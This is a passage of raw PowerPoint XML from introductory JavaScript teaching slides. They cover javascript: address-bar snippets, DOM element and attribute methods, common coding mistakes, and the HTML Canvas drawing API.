            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1981200" y="1600200"/>
            <a:ext cx="8229600" cy="5043488"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>You can enter JavaScript into the address field in any browser, but just setting the protocol to javascript</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>	javascript:1+2 // will display 3 on the web page</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>If you don't want the web page to be deleted, add void 0 at the end</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>javascript:alert(1+2);void 0</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2000">
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Edit any web page</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javascript:document.body.contentEditable='true';document.designMode='on';void 0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Display current date and time</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javascript:alert(new Date().toString());void 0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>JavaScript calculator with error checking and memory</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>  javascript:$="";for(;;){$=prompt("Input JavaScript expression or press cancel to exit", $);if(!$) break; try{alert($+" =\n"+eval($))} catch(e) {alert(e)}};void 0</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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D62E70B3-2411-47B7-BC0B-DB3AA4D8AB85}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Creating Elements and Attributes</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="131075" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C8F7533C-145B-49D1-9DC4-1E57B81CA92C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>element</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>document.createElement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>tagName[, options]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>) creates a new element</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>element</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>appendChild</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>aChild</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>) appends a child node to an element</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>oldChild</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>node</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>removeChild</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>child</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>) removes the child node</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>element</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>setAttribute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>name, value</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>) set attribute of element</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>attribute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>element</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>getAttribute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>attributeName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>) reads an attribute value</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>element</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>removeAttribute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>attrName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>) removes an attribute</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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{11393D7A-CE94-4BE5-81C5-728DFCE94E65}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Example of Manipulating DOM</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="132099" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B1625F26-1737-44EF-AB52-158F7B86C242}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>let audio = document.createElement("audio");            document.body.appendChild(audio);            audio.setAttribute("id", id);            audio.setAttribute("preload", "auto");            audio.setAttribute("src", src);</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>let elem = document.getElementById("xyz");</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>let href = elem.getAttribute("href");</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>elem.removeAttribute("rev");</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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9792E7AF-315E-413C-9D4C-1424BB5B70CB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Common JavaScript Mistakes</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="119811" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A208B6ED-E90B-43E1-B150-FCB775CFF125}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>incorrect amount of curly braces or parentheses</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>use === and !== for comparisons instead of == and != unless you know what you're doing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>forgetting that </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>any variable </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>declared inside a function without </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>keyword is global</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>using a name, which overlaps with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Window object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t> e.g. alert, blur, close, focus, home, print, prompt, start, stop</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="fi-FI"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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{14C15036-A68A-437A-9BA7-AC8F7C30EA26}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Canvas</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="134147" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{806BD90E-3926-4D9D-B442-72B1C7A13A6B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="766763" y="1600200"/>
            <a:ext cx="10729912" cy="4900613"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>Canvas = drawable region defined in HTML with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>width</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>height</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> attributes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>2D drawing API with ability to draw lines, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0" err="1">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>Bézier</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t> curves</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, filled surfaces, bitmap images, do 2D transformations &amp; rotations, draw text</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>Introduced by Apple in Safari year 2004. Officially part of HTML5 standard.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>Canvas is supported by all major desktop and mobile browsers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>Main competitors: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>WebGL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>Scalable Vector Graphics (SVG)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> (and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:hlinkClick r:id="rId6"/>
              </a:rPr>
              <a:t>Adobe Flash</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> )</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>WebGL offers 3D as well and access to low level features such </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:hlinkClick r:id="rId7"/>
              </a:rPr>
              <a:t>pixel shaders</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>, but is significantly more difficult to use without an external API, such as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0">
                <a:hlinkClick r:id="rId8"/>
              </a:rPr>
              <a:t>tree.js</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>Summary: Canvas offers ease of use compared to WebGL and it is suited for 2D applications, where utmost performance is not an issue, but you want better performance with lots of objects than SVG can achieve.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{96CD9A47-3FD3-4D44-83DC-759D36BFAB5B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Canvas Capabilities</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="135171" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9095032D-696E-4144-BAA4-9C988DA16680}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800"/>
              <a:t>drawing filled and normal rectangles</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800"/>
              <a:t>drawing lines, circular arcs, quadratic and cubic Bézier curves and filling regions defined by a path</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800"/>
              <a:t>setting the clipping region</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800"/>
              <a:t>drawing 2D bitmap images (partially &amp; with scaling)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800"/>
              <a:t>setting stroking &amp; filling color, including adjustable transparency (alpha), lines styles and gradients</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800"/>
              <a:t>transformations: translation, rotation, scaling, 2D transformation matrix </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800"/>
              <a:t>different composition modes: on top &amp; under existing canvas content, combining colors, XOR</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800"/>
              <a:t>See Mozilla </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Canvas tutorial</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800"/>
              <a:t> &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>cheat sheet</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="280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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{779D395D-924F-410E-88ED-9F7B1DAF60D4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
